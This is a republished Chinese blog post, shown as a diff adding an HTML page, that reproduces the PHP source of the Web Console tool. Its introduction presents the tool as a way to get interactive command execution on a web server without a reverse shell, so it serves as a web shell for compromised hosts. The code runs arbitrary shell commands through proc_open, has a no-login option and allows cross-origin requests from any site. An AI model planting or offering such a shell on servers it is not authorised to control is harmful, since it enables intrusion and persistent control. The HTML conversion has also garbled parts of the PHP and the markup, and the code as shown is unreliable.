@@ -1,0 +1,1117 @@
+<!doctype html>
+<html lang="en-us">
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+    <title>交互式shell脚本webconsole | 开发者问答集锦</title>
+    <meta property="og:title" content="交互式shell脚本webconsole - 开发者问答集锦">
+    <meta property="og:type" content="article">
+        
+    <meta property="article:published_time" content='2020-09-02T00:00:00&#43;08:00'>
+        
+        
+    <meta property="article:modified_time" content='2020-09-02T00:00:00&#43;08:00'>
+        
+    <meta name="Keywords" content="">
+    <meta name="description" content="交互式shell脚本webconsole">
+        
+    <meta name="author" content="">
+    <meta property="og:url" content="https://zaina.newban.cn/posts/%E4%BA%A4%E4%BA%92%E5%BC%8Fshell%E8%84%9A%E6%9C%ACwebconsole/">
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+
+    <link rel="stylesheet" href='/css/normalize.css'>
+    <link rel="stylesheet" href='/css/style.css'>
+    <script type="text/javascript" src="//cdn.bootcdn.net/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+
+    
+    
+    
+    
+    
+    
+</head>
+
+
+<body>
+    <header id="header" class="clearfix">
+    <div class="container">
+        <div class="col-group">
+            <div class="site-name ">
+                
+                    <a id="logo" href="https://zaina.newban.cn">
+                        开发者问答集锦
+                    </a>
+                
+                
+            </div>
+            <div>
+                <nav id="nav-menu" class="clearfix">
+                    <a class="" href="https://zaina.newban.cn">首页</a>
+                    
+                </nav>
+            </div>
+        </div>
+    </div>
+</header>
+
+    <div id="body">
+        <div class="container">
+            <div class="col-group">
+
+                <div class="col-8" id="main">
+                    
+<div class="res-cons">
+    
+    <article class="post">
+        <header>
+            <h1 class="post-title">交互式shell脚本webconsole</h1>
+        </header>
+        <date class="post-meta meta-date">
+            2020年9月2日
+        </date>
+        
+        
+        <div class="post-meta">
+            <span id="busuanzi_container_page_pv">|<span id="busuanzi_value_page_pv"></span><span>
+                    阅读</span></span>
+        </div>
+        
+        
+        <div class="post-content">
+            <p>官网：<a href="http://web-console.org/">http://web-console.org/</a></p>
+
+<p>这个脚本可以实现web下交互，也就是有了这玩意后可以不用反弹shell了。</p>
+
+<pre><code>php
+// Web Console v0.9.7 (2016-11-05)
+//
+// Author: Nickolay Kovalev (http://nickola.ru)
+// GitHub: https://github.com/nickola/web-console
+// URL: http://web-console.org
+
+// Disable login (don't ask for credentials, be careful)
+// Example: $NO_LOGIN = true;
+$NO_LOGIN = false;
+
+// Single-user credentials
+// Example: $USER = 'user'; $PASSWORD = 'password';
+$USER = '';
+$PASSWORD = '';
+
+// Multi-user credentials
+// Example: $ACCOUNTS = array('user1' =&gt; 'password1', 'user2' =&gt; 'password2');
+$ACCOUNTS = array();
+
+// Password hash algorithm (password must be hashed)
+// Example: $PASSWORD_HASH_ALGORITHM = 'md5';
+//          $PASSWORD_HASH_ALGORITHM = 'sha256';
+$PASSWORD_HASH_ALGORITHM = '';
+
+// Home directory (multi-user mode supported)
+// Example: $HOME_DIRECTORY = '/tmp';
+//          $HOME_DIRECTORY = array('user1' =&gt; '/home/user1', 'user2' =&gt; '/home/user2');
+$HOME_DIRECTORY = '';
+
+// Code below is automatically generated from different components
+// For more information see: https://github.com/nickola/web-console
+//
+// Used components:
+//   - jQuery JavaScript Library: https://github.com/jquery/jquery
+//   - jQuery Terminal Emulator: https://github.com/jcubic/jquery.terminal
+//   - jQuery Mouse Wheel Plugin: https://github.com/brandonaaron/jquery-mousewheel
+//   - PHP JSON-RPC 2.0 Server/Client Implementation: https://github.com/sergeyfast/eazy-jsonrpc
+//   - Normalize.css: https://github.com/necolas/normalize.css
+?&gt;
+php
+
+
+    /**
+     * JSON RPC Server for Eaze
+     *
+     * Reads $_GET['rawRequest'] or php://input for Request Data
+     * @link       http://www.jsonrpc.org/specification
+     * @link       http://dojotoolkit.org/reference-guide/1.8/dojox/rpc/smd.html
+     * @package    Eaze
+     * @subpackage Model
+     * @author     Sergeyfast
+     */
+    class BaseJsonRpcServer {
+
+        const ParseError = -32700,
+            InvalidRequest = -32600,
+            MethodNotFound = -32601,
+            InvalidParams = -32602,
+            InternalError = -32603;
+
+        /**
+         * Exposed Instances
+         * @var object[]    namespace =&gt; method
+         */
+        protected $instances = array();
+
+        /**
+         * Decoded Json Request
+         * @var object|array
+         */
+        protected $request;
+
+        /**
+         * Array of Received Calls
+         * @var array
+         */
+        protected $calls = array();
+
+        /**
+         * Array of Responses for Calls
+         * @var array
+         */
+        protected $response = array();
+
+        /**
+         * Has Calls Flag (not notifications)
+         * @var bool
+         */
+        protected $hasCalls = false;
+
+        /**
+         * Is Batch Call in using
+         * @var bool
+         */
+        private $isBatchCall = false;
+
+        /**
+         * Hidden Methods
+         * @var array
+         */
+        protected $hiddenMethods = array(
+            'execute', '__construct', 'registerinstance'
+        );
+
+        /**
+         * Content Type
+         * @var string
+         */
+        public $ContentType = 'application/json';
+
+        /**
+         * Allow Cross-Domain Requests
+         * @var bool
+         */
+        public $IsXDR = true;
+
+        /**
+         * Max Batch Calls
+         * @var int
+         */
+        public $MaxBatchCalls = 10;
+
+        /**
+         * Error Messages
+         * @var array
+         */
+        protected $errorMessages = array(
+            self::ParseError     =&gt; 'Parse error',
+            self::InvalidRequest =&gt; 'Invalid Request',
+            self::MethodNotFound =&gt; 'Method not found',
+            self::InvalidParams  =&gt; 'Invalid params',
+            self::InternalError  =&gt; 'Internal error',
+        );
+
+
+        /**
+         * Cached Reflection Methods
+         * @var ReflectionMethod[]
+         */
+        private $reflectionMethods = array();
+
+
+        /**
+         * Validate Request
+         * @return int error
+         */
+        private function getRequest() {
+            $error = null;
+
+            do {
+                if ( array_key_exists( 'REQUEST_METHOD', $_SERVER ) &amp;&amp; $_SERVER['REQUEST_METHOD'] != 'POST' ) {
+                    $error = self::InvalidRequest;
+                    break;
+                };
+
+                $request       = !empty( $_GET['rawRequest'] ) ? $_GET['rawRequest'] : file_get_contents( 'php://input' );
+                $this-&gt;request = json_decode( $request, false );
+                if ( $this-&gt;request === null ) {
+                    $error = self::ParseError;
+                    break;
+                }
+
+                if ( $this-&gt;request === array() ) {
+                    $error = self::InvalidRequest;
+                    break;
+                }
+
+                // check for batch call
+                if ( is_array( $this-&gt;request ) ) {
+                    if( count( $this-&gt;request ) &gt; $this-&gt;MaxBatchCalls ) {
+                        $error = self::InvalidRequest;
+                        break;
+                    }
+
+                    $this-&gt;calls       = $this-&gt;request;
+                    $this-&gt;isBatchCall = true;
+                } else {
+                    $this-&gt;calls[] = $this-&gt;request;
+                }
+            } while ( false );
+
+            return $error;
+        }
+
+
+        /**
+         * Get Error Response
+         * @param int   $code
+         * @param mixed $id
+         * @param null  $data
+         * @return array
+         */
+        private function getError( $code, $id = null, $data = null ) {
+            return array(
+                'jsonrpc' =&gt; '2.0',
+                'id'      =&gt; $id,
+                'error'   =&gt; array(
+                    'code'    =&gt; $code,
+                    'message' =&gt; isset( $this-&gt;errorMessages[$code] ) ? $this-&gt;errorMessages[$code] : $this-&gt;errorMessages[self::InternalError],
+                    'data'    =&gt; $data,
+                ),
+            );
+        }
+
+
+        /**
+         * Check for jsonrpc version and correct method
+         * @param object $call
+         * @return array|null
+         */
+        private function validateCall( $call ) {
+            $result = null;
+            $error  = null;
+            $data   = null;
+            $id     = is_object( $call ) &amp;&amp; property_exists( $call, 'id' ) ? $call-&gt;id : null;
+            do {
+                if ( !is_object( $call ) ) {
+                    $error = self::InvalidRequest;
+                    break;
+                }
+
+                // hack for inputEx smd tester
+                if ( property_exists( $call, 'version' ) ) {
+                    if ( $call-&gt;version == 'json-rpc-2.0' ) {
+                        $call-&gt;jsonrpc = '2.0';
+                    }
+                }
+
+                if ( !property_exists( $call, 'jsonrpc' ) || $call-&gt;jsonrpc != '2.0' ) {
+                    $error = self::InvalidRequest;
+                    break;
+                }
+
+                $fullMethod = property_exists( $call, 'method' ) ? $call-&gt;method : '';
+                $methodInfo = explode( '.', $fullMethod, 2 );
+                $namespace  = array_key_exists( 1, $methodInfo ) ? $methodInfo[0] : '';
+                $method     = $namespace ? $methodInfo[1] : $fullMethod;
+                if ( !$method || !array_key_exists( $namespace, $this-&gt;instances ) || !method_exists( $this-&gt;instances[$namespace], $method ) || in_array( strtolower( $method ), $this-&gt;hiddenMethods ) ) {
+                    $error = self::MethodNotFound;
+                    break;
+                }
+
+                if ( !array_key_exists( $fullMethod, $this-&gt;reflectionMethods ) ) {
+                    $this-&gt;reflectionMethods[$fullMethod] = new ReflectionMethod( $this-&gt;instances[$namespace], $method );
+                }
+
+                /** @var $params array */
+                $params     = property_exists( $call, 'params' ) ? $call-&gt;params : null;
+                $paramsType = gettype( $params );
+                if ( $params !== null &amp;&amp; $paramsType != 'array' &amp;&amp; $paramsType != 'object' ) {
+                    $error = self::InvalidParams;
+                    break;
+                }
+
+                // check parameters
+                switch ( $paramsType ) {
+                    case 'array':
+                        $totalRequired = 0;
+                        // doesn't hold required, null, required sequence of params
+                        foreach ( $this-&gt;reflectionMethods[$fullMethod]-&gt;getParameters() as $param ) {
+                            if ( !$param-&gt;isDefaultValueAvailable() ) {
+                                $totalRequired++;
+                            }
+                        }
+
+                        if ( count( $params ) &lt; $totalRequired ) {
+                            $error = self::InvalidParams;
+                            $data  = sprintf( 'Check numbers of required params (got %d, expected %d)', count( $params ), $totalRequired );
+                        }
+                        break;
+                    case 'object':
+                        foreach ( $this-&gt;reflectionMethods[$fullMethod]-&gt;getParameters() as $param ) {
+                            if ( !$param-&gt;isDefaultValueAvailable() &amp;&amp; !array_key_exists( $param-&gt;getName(), $params ) ) {
+                                $error = self::InvalidParams;
+                                $data  = $param-&gt;getName() . ' not found';
+
+                                break 3;
+                            }
+                        }
+                        break;
+                    case 'NULL':
+                        if ( $this-&gt;reflectionMethods[$fullMethod]-&gt;getNumberOfRequiredParameters() &gt; 0 ) {
+                            $error = self::InvalidParams;
+                            $data  = 'Empty required params';
+                            break 2;
+                        }
+                        break;
+                }
+
+            } while ( false );
+
+            if ( $error ) {
+                $result = array( $error, $id, $data );
+            }
+
+            return $result;
+        }
+
+
+        /**
+         * Process Call
+         * @param $call
+         * @return array|null
+         */
+        private function processCall( $call ) {
+            $id        = property_exists( $call, 'id' ) ? $call-&gt;id : null;
+            $params    = property_exists( $call, 'params' ) ? $call-&gt;params : array();
+            $result    = null;
+            $namespace = substr( $call-&gt;method, 0, strpos( $call-&gt;method, '.' ) );
+
+            try {
+                // set named parameters
+                if ( is_object( $params ) ) {
+                    $newParams = array();
+                    foreach ( $this-&gt;reflectionMethods[$call-&gt;method]-&gt;getParameters() as $param ) {
+                        $paramName    = $param-&gt;getName();
+                        $defaultValue = $param-&gt;isDefaultValueAvailable() ? $param-&gt;getDefaultValue() : null;
+                        $newParams[]  = property_exists( $params, $paramName ) ? $params-&gt;$paramName : $defaultValue;
+                    }
+
+                    $params = $newParams;
+                }
+
+                // invoke
+                $result = $this-&gt;reflectionMethods[$call-&gt;method]-&gt;invokeArgs( $this-&gt;instances[$namespace], $params );
+            } catch ( Exception $e ) {
+                return $this-&gt;getError( $e-&gt;getCode(), $id, $e-&gt;getMessage() );
+            }
+
+            if ( !$id &amp;&amp; $id !== 0 ) {
+                return null;
+            }
+
+            return array(
+                'jsonrpc' =&gt; '2.0',
+                'result'  =&gt; $result,
+                'id'      =&gt; $id,
+            );
+        }
+
+
+        /**
+         * Create new Instance
+         * @param object $instance
+         */
+        public function __construct( $instance = null ) {
+            if ( get_parent_class( $this ) ) {
+                $this-&gt;RegisterInstance( $this, '' );
+            } else if ( $instance ) {
+                $this-&gt;RegisterInstance( $instance, '' );
+            }
+        }
+
+
+        /**
+         * Register Instance
+         * @param object $instance
+         * @param string $namespace default is empty string
+         * @return $this
+         */
+        public function RegisterInstance( $instance, $namespace = '' ) {
+            $this-&gt;instances[$namespace]                = $instance;
+            $this-&gt;instances[$namespace]-&gt;errorMessages = $this-&gt;errorMessages;
+
+            return $this;
+        }
+
+
+        /**
+         * Handle Requests
+         */
+        public function Execute() {
+            do {
+                // check for SMD Discovery request
+                if ( array_key_exists( 'smd', $_GET ) ) {
+                    $this-&gt;response[] = $this-&gt;getServiceMap();
+                    $this-&gt;hasCalls   = true;
+                    break;
+                }
+
+                $error = $this-&gt;getRequest();
+                if ( $error ) {
+                    $this-&gt;response[] = $this-&gt;getError( $error );
+                    $this-&gt;hasCalls   = true;
+                    break;
+                }
+
+                foreach ( $this-&gt;calls as $call ) {
+                    $error = $this-&gt;validateCall( $call );
+                    if ( $error ) {
+                        $this-&gt;response[] = $this-&gt;getError( $error[0], $error[1], $error[2] );
+                        $this-&gt;hasCalls   = true;
+                    } else {
+                        $result = $this-&gt;processCall( $call );
+                        if ( $result ) {
+                            $this-&gt;response[] = $result;
+                            $this-&gt;hasCalls   = true;
+                        }
+                    }
+                }
+            } while ( false );
+
+            // flush response
+            if ( $this-&gt;hasCalls ) {
+                if ( !$this-&gt;isBatchCall ) {
+                    $this-&gt;response = reset( $this-&gt;response );
+                }
+
+                if ( !headers_sent() ) {
+                    // Set Content Type
+                    if ( $this-&gt;ContentType ) {
+                        header( 'Content-Type: ' . $this-&gt;ContentType );
+                    }
+
+                    // Allow Cross Domain Requests
+                    if ( $this-&gt;IsXDR ) {
+                        header( 'Access-Control-Allow-Origin: *' );
+                        header( 'Access-Control-Allow-Headers: x-requested-with, content-type' );
+                    }
+                }
+
+                echo json_encode( $this-&gt;response );
+                $this-&gt;resetVars();
+            }
+        }
+
+
+        /**
+         * Get Doc Comment
+         * @param $comment
+         * @return string|null
+         */
+        private function getDocDescription( $comment ) {
+            $result = null;
+            if ( preg_match( '/\*\s+([^@]*)\s+/s', $comment, $matches ) ) {
+                $result = str_replace( '*', &quot;\n&quot;, trim( trim( $matches[1], '*' ) ) );
+            }
+
+            return $result;
+        }
+
+
+        /**
+         * Get Service Map
+         * Maybe not so good realization of auto-discover via doc blocks
+         * @return array
+         */
+        private function getServiceMap() {
+            $result = array(
+                'transport'   =&gt; 'POST',
+                'envelope'    =&gt; 'JSON-RPC-2.0',
+                'SMDVersion'  =&gt; '2.0',
+                'contentType' =&gt; 'application/json',
+                'target'      =&gt; !empty( $_SERVER['REQUEST_URI'] ) ? substr( $_SERVER['REQUEST_URI'], 0, strpos( $_SERVER['REQUEST_URI'], '?' ) ) : '',
+                'services'    =&gt; array(),
+                'description' =&gt; '',
+            );
+
+            foreach( $this-&gt;instances as $namespace =&gt; $instance ) {
+                $rc = new ReflectionClass( $instance);
+
+                // Get Class Description
+                if ( $rcDocComment = $this-&gt;getDocDescription( $rc-&gt;getDocComment() ) ) {
+                    $result['description'] .= $rcDocComment . PHP_EOL;
+                }
+
+                foreach ( $rc-&gt;getMethods() as $method ) {
+                    /** @var ReflectionMethod $method */
+                    if ( !$method-&gt;isPublic() || in_array( strtolower( $method-&gt;getName() ), $this-&gt;hiddenMethods ) ) {
+                        continue;
+                    }
+
+                    $methodName = ( $namespace ? $namespace . '.' : '' ) . $method-&gt;getName();
+                    $docComment = $method-&gt;getDocComment();
+
+                    $result['services'][$methodName] = array( 'parameters' =&gt; array() );
+
+                    // set description
+                    if ( $rmDocComment = $this-&gt;getDocDescription( $docComment ) ) {
+                        $result['services'][$methodName]['description'] = $rmDocComment;
+                    }
+
+                    // @param\s+([^\s]*)\s+([^\s]*)\s*([^\s\*]*)
+                    $parsedParams = array();
+                    if ( preg_match_all( '/@param\s+([^\s]*)\s+([^\s]*)\s*([^\n\*]*)/', $docComment, $matches ) ) {
+                        foreach ( $matches[2] as $number =&gt; $name ) {
+                            $type = $matches[1][$number];
+                            $desc = $matches[3][$number];
+                            $name = trim( $name, '$' );
+
+                            $param               = array( 'type' =&gt; $type, 'description' =&gt; $desc );
+                            $parsedParams[$name] = array_filter( $param );
+                        }
+                    };
+
+                    // process params
+                    foreach ( $method-&gt;getParameters() as $parameter ) {
+                        $name  = $parameter-&gt;getName();
+                        $param = array( 'name' =&gt; $name, 'optional' =&gt; $parameter-&gt;isDefaultValueAvailable() );
+                        if ( array_key_exists( $name, $parsedParams ) ) {
+                            $param += $parsedParams[$name];
+                        }
+
+                        if ( $param['optional'] ) {
+                            $param['default'] = $parameter-&gt;getDefaultValue();
+                        }
+
+                        $result['services'][$methodName]['parameters'][] = $param;
+                    }
+
+                    // set return type
+                    if ( preg_match( '/@return\s+([^\s]+)\s*([^\n\*]+)/', $docComment, $matches ) ) {
+                        $returns                                    = array( 'type' =&gt; $matches[1], 'description' =&gt; trim( $matches[2] ) );
+                        $result['services'][$methodName]['returns'] = array_filter( $returns );
+                    }
+                }
+            }
+
+            return $result;
+        }
+
+
+        /**
+         * Reset Local Class Vars after Execute
+         */
+        private function resetVars() {
+            $this-&gt;response = $this-&gt;calls = array();
+            $this-&gt;hasCalls = $this-&gt;isBatchCall = false;
+        }
+
+    }
+?&gt;
+php
+// Initializing
+if (!isset($NO_LOGIN)) $NO_LOGIN = false;
+if (!isset($ACCOUNTS)) $ACCOUNTS = array();
+if (isset($USER) &amp;&amp; isset($PASSWORD) &amp;&amp; $USER &amp;&amp; $PASSWORD) $ACCOUNTS[$USER] = $PASSWORD;
+if (!isset($PASSWORD_HASH_ALGORITHM)) $PASSWORD_HASH_ALGORITHM = '';
+if (!isset($HOME_DIRECTORY)) $HOME_DIRECTORY = '';
+$IS_CONFIGURED = ($NO_LOGIN || count($ACCOUNTS) &gt;= 1) ? true : false;
+
+// Utilities
+function is_empty_string($string) {
+    return strlen($string) &lt;= 0;
+}
+
+function is_equal_strings($string1, $string2) {
+    return strcmp($string1, $string2) == 0;
+}
+
+function get_hash($algorithm, $string) {
+    return hash($algorithm, trim((string) $string));
+}
+
+// Command execution
+function execute_command($command) {
+    $descriptors = array(
+        0 =&gt; array('pipe', 'r'), // STDIN
+        1 =&gt; array('pipe', 'w'), // STDOUT
+        2 =&gt; array('pipe', 'w')  // STDERR
+    );
+
+    $process = proc_open($command . ' 2&gt;&amp;1', $descriptors, $pipes);
+    if (!is_resource($process)) die(&quot;Can't execute command.&quot;);
+
+    // Nothing to push to STDIN
+    fclose($pipes[0]);
+
+    $output = stream_get_contents($pipes[1]);
+    fclose($pipes[1]);
+
+    $error = stream_get_contents($pipes[2]);
+    fclose($pipes[2]);
+
+    // All pipes must be closed before &quot;proc_close&quot;
+    $code = proc_close($process);
+
+    return $output;
+}
+
+// Command parsing
+function parse_command($command) {
+    $value = ltrim((string) $command);
+
+    if (!is_empty_string($value)) {
+        $values = explode(' ', $value);
+        $values_total = count($values);
+
+        if ($values_total &gt; 1) {
+            $value = $values[$values_total - 1];
+
+            for ($index = $values_total - 2; $index &gt;= 0; $index--) {
+                $value_item = $values[$index];
+
+                if (substr($value_item, -1) == '\\') $value = $value_item . ' ' . $value;
+                else break;
+            }
+        }
+    }
+
+    return $value;
+}
+
+// RPC Server
+class WebConsoleRPCServer extends BaseJsonRpcServer {
+    protected $home_directory = '';
+
+    private function error($message) {
+        throw new Exception($message);
+    }
+
+    // Authentication
+    private function authenticate_user($user, $password) {
+        $user = trim((string) $user);
+        $password = trim((string) $password);
+
+        if ($user &amp;&amp; $password) {
+            global $ACCOUNTS, $PASSWORD_HASH_ALGORITHM;
+
+            if (isset($ACCOUNTS[$user]) &amp;&amp; !is_empty_string($ACCOUNTS[$user])) {
+                if ($PASSWORD_HASH_ALGORITHM) $password = get_hash($PASSWORD_HASH_ALGORITHM, $password);
+
+                if (is_equal_strings($password, $ACCOUNTS[$user]))
+                    return $user . ':' . get_hash('sha256', $password);
+            }
+        }
+
+        throw new Exception(&quot;Incorrect user or password&quot;);
+    }
+
+    private function authenticate_token($token) {
+        global $NO_LOGIN;
+        if ($NO_LOGIN) return true;
+
+        $token = trim((string) $token);
+        $token_parts = explode(':', $token, 2);
+
+        if (count($token_parts) == 2) {
+            $user = trim((string) $token_parts[0]);
+            $password_hash = trim((string) $token_parts[1]);
+
+            if ($user &amp;&amp; $password_hash) {
+                global $ACCOUNTS;
+
+                if (isset($ACCOUNTS[$user]) &amp;&amp; !is_empty_string($ACCOUNTS[$user])) {
+                    $real_password_hash = get_hash('sha256', $ACCOUNTS[$user]);
+                    if (is_equal_strings($password_hash, $real_password_hash)) return $user;
+                }
+            }
+        }
+
+        throw new Exception(&quot;Incorrect user or password&quot;);
+    }
+
+    private function get_home_directory($user) {
+        global $HOME_DIRECTORY;
+
+        if (is_string($HOME_DIRECTORY)) {
+            if (!is_empty_string($HOME_DIRECTORY)) return $HOME_DIRECTORY;
+        }
+        else if (is_string($user) &amp;&amp; !is_empty_string($user) &amp;&amp; isset($HOME_DIRECTORY[$user]) &amp;&amp; !is_empty_string($HOME_DIRECTORY[$user]))
+            return $HOME_DIRECTORY[$user];
+
+        return getcwd();
+    }
+
+    // Environment
+    private function get_environment() {
+        $hostname = function_exists('gethostname') ? gethostname() : null;
+        return array('path' =&gt; getcwd(), 'hostname' =&gt; $hostname);
+    }
+
+    private function set_environment($environment) {
+        $environment = !empty($environment) ? (array) $environment : array();
+        $path = (isset($environment['path']) &amp;&amp; !is_empty_string($environment['path'])) ? $environment['path'] : $this-&gt;home_directory;
+
+        if (!is_empty_string($path)) {
+            if (is_dir($path)) {
+                if (!@chdir($path)) return array('output' =&gt; &quot;Unable to change directory to current working directory, updating current directory&quot;,
+                                                 'environment' =&gt; $this-&gt;get_environment());
+            }
+            else return array('output' =&gt; &quot;Current working directory not found, updating current directory&quot;,
+                              'environment' =&gt; $this-&gt;get_environment());
+        }
+    }
+
+    // Initialization
+    private function initialize($token, $environment) {
+        $user = $this-&gt;authenticate_token($token);
+        $this-&gt;home_directory = $this-&gt;get_home_directory($user);
+        $result = $this-&gt;set_environment($environment);
+
+        if ($result) return $result;
+    }
+
+    // Methods
+    public function login($user, $password) {
+        $result = array('token' =&gt; $this-&gt;authenticate_user($user, $password),
+                        'environment' =&gt; $this-&gt;get_environment());
+
+        $home_directory = $this-&gt;get_home_directory($user);
+        if (!is_empty_string($home_directory)) {
+            if (is_dir($home_directory)) $result['environment']['path'] = $home_directory;
+            else $result['output'] = &quot;Home directory not found: &quot;. $home_directory;
+        }
+
+        return $result;
+    }
+
+    public function cd($token, $environment, $path) {
+        $result = $this-&gt;initialize($token, $environment);
+        if ($result) return $result;
+
+        $path = trim((string) $path);
+        if (is_empty_string($path)) $path = $this-&gt;home_directory;
+
+        if (!is_empty_string($path)) {
+            if (is_dir($path)) {
+                if (!@chdir($path)) return array('output' =&gt; &quot;cd: &quot;. $path . &quot;: Unable to change directory&quot;);
+            }
+            else return array('output' =&gt; &quot;cd: &quot;. $path . &quot;: No such directory&quot;);
+        }
+
+        return array('environment' =&gt; $this-&gt;get_environment());
+    }
+
+    public function completion($token, $environment, $pattern, $command) {
+        $result = $this-&gt;initialize($token, $environment);
+        if ($result) return $result;
+
+        $scan_path = '';
+        $completion_prefix = '';
+        $completion = array();
+
+        if (!empty($pattern)) {
+            if (!is_dir($pattern)) {
+                $pattern = dirname($pattern);
+                if ($pattern == '.') $pattern = '';
+            }
+
+            if (!empty($pattern)) {
+                if (is_dir($pattern)) {
+                    $scan_path = $completion_prefix = $pattern;
+                    if (substr($completion_prefix, -1) != '/') $completion_prefix .= '/';
+                }
+            }
+            else $scan_path = getcwd();
+        }
+        else $scan_path = getcwd();
+
+        if (!empty($scan_path)) {
+            // Loading directory listing
+            $completion = array_values(array_diff(scandir($scan_path), array('..', '.')));
+            natsort($completion);
+
+            // Prefix
+            if (!empty($completion_prefix) &amp;&amp; !empty($completion)) {
+                foreach ($completion as &amp;$value) $value = $completion_prefix . $value;
+            }
+
+            // Pattern
+            if (!empty($pattern) &amp;&amp; !empty($completion)) {
+                // For PHP version that does not support anonymous functions (available since PHP 5.3.0)
+                function filter_pattern($value) {
+                    global $pattern;
+                    return !strncmp($pattern, $value, strlen($pattern));
+                }
+
+                $completion = array_values(array_filter($completion, 'filter_pattern'));
+            }
+        }
+
+        return array('completion' =&gt; $completion);
+    }
+
+    public function run($token, $environment, $command) {
+        $result = $this-&gt;initialize($token, $environment);
+        if ($result) return $result;
+
+        $output = ($command &amp;&amp; !is_empty_string($command)) ? execute_command($command) : '';
+        if ($output &amp;&amp; substr($output, -1) == &quot;\n&quot;) $output = substr($output, 0, -1);
+
+        return array('output' =&gt; $output);
+    }
+}
+
+// Processing request
+if (array_key_exists('REQUEST_METHOD', $_SERVER) &amp;&amp; $_SERVER['REQUEST_METHOD'] == 'POST') {
+    $rpc_server = new WebConsoleRPCServer();
+    $rpc_server-&gt;Execute();
+}
+else if (!$IS_CONFIGURED) {
+?&gt;
+
+
+
+
+
+        Web Console
+
+
+
+
+
+
+
+
+
+class=&quot;configure&quot;&gt;
+
+
+Web Console must be configured before use:
+
+
+
+
+
+
+  * Open Web Console PHP file in your favorite text editor.
+
+
+  * At the beginning of the file enter your class=&quot;variable&quot;&gt;$USER and class=&quot;variable&quot;&gt;$PASSWORD credentials, edit any other settings that you like (see description in the comments).
+
+
+  * Upload changed file to the web server and open it in the browser.
+
+
+
+
+
+For more information visit Web Console website: [http://web-console.org](http://web-console.org)
+
+
+
+
+
+
+
+php
+}
+else { ?&gt;
+
+class=&quot;no-js&quot;&gt;
+
+
+
+        Web Console
+</code></pre>
+
+<p>转载于:<a href="https://www.cnblogs.com/hookjoy/p/11029086.html">https://www.cnblogs.com/hookjoy/p/11029086.html</a></p>
+
+        </div>
+
+        
+
+
+        
+
+<div class="post-archive">
+    <h2>See Also</h2>
+    <ul class="listing">
+        
+        <li><a href="/posts/007hadoop%E9%9B%86%E7%BE%A4%E9%85%8D%E7%BD%AEhadoop%E9%9B%86%E7%BE%A4%E7%9A%84%E5%90%AF%E5%8A%A8%E5%92%8C%E6%B5%8B%E8%AF%95ssh%E5%85%8D%E7%99%BB%E9%99%86%E9%85%8D%E7%BD%AEstartallshhdfs%E5%B8%B8%E7%94%A8%E7%9A%84shell/">007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell</a></li>
+        
+        <li><a href="/posts/009shell%E8%84%9A%E6%9C%AC%E4%B8%8B%E6%9D%A1%E4%BB%B6%E6%B5%8B%E8%AF%95eqne/">009Shell脚本下条件测试eqne</a></li>
+        
+        <li><a href="/posts/00pythonmanagepyshell%E5%92%8Cpython%E7%9A%84%E5%88%86%E6%9E%90/">00Pythonmanagepyshell和Python的分析</a></li>
+        
+        <li><a href="/posts/010zookeeper%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5zookeeper%E7%9A%84%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BAzookeeper%E7%9A%84shell%E5%91%BD%E4%BB%A4/">010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令</a></li>
+        
+        <li><a href="/posts/018dockerfileshell/">018DockerfileSHELL</a></li>
+        
+    </ul>
+</div>
+
+
+        <div class="post-meta meta-tags">
+            
+            <ul class="clearfix">
+                
+                <li><a href='https://zaina.newban.cn/tags/shell'>shell</a></li>
+                
+            </ul>
+            
+        </div>
+    </article>
+    
+    
+
+    
+    
+</div>
+
+                    <footer id="footer">
+    <div>
+        &copy; 2020 <a href="https://zaina.newban.cn">开发者问答集锦 By </a>
+        
+    </div>
+    <br />
+    <div>
+        <div class="github-badge">
+            <a href="https://gohugo.io/" target="_black" rel="nofollow"><span class="badge-subject">Powered by</span><span class="badge-value bg-blue">Hugo</span></a>
+        </div>
+        <div class="github-badge">
+            <a href="https://www.flysnow.org/" target="_black"><span class="badge-subject">Design by</span><span class="badge-value bg-brightgreen">飞雪无情</span></a>
+        </div>
+        <div class="github-badge">
+            <a href="https://github.com/flysnow-org/maupassant-hugo" target="_black"><span class="badge-subject">Theme</span><span class="badge-value bg-yellowgreen">Maupassant</span></a>
+        </div>
+    </div>
+</footer>
+
+
+    
+    <script type="text/javascript">
+        window.MathJax = {
+            tex2jax: {
+                inlineMath: [['$', '$']],
+                processEscapes: true
+                }
+            };
+    </script>
+    <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML' async></script>
+
+<a id="rocket" href="#top"></a>
+<script type="text/javascript" src='/js/totop.js?v=0.0.0' async=""></script>
+
+
+
+    <script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+
+
+
+                </div>
+
+                <div id="secondary">
+    <section class="widget">
+        <form id="search" action='https://zaina.newban.cn/search/' method="get" accept-charset="utf-8" target="_blank" _lpchecked="1">
+      
+      <input type="text" name="q" maxlength="20" placeholder="Search">
+      <input type="hidden" name="sitesearch" value="https://zaina.newban.cn">
+      <button type="submit" class="submit icon-search"></button>
+</form>
+    </section>
+    
+    <section class="widget">
+        <h3 class="widget-title">最近文章</h3>
+<ul class="widget-list">
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/001rubyruby%E4%B8%AD%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%AE%9E%E4%BE%8B%E5%8F%98%E9%87%8F%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E7%B1%BB%E5%8F%98%E9%87%8Fsymbol%E5%AF%B9%E6%AF%94/" title="001rubyRuby中全局变量实例变量局部变量类变量Symbol对比">001rubyRuby中全局变量实例变量局部变量类变量Symbol对比</a>
+    </li>
+    
+    <li>
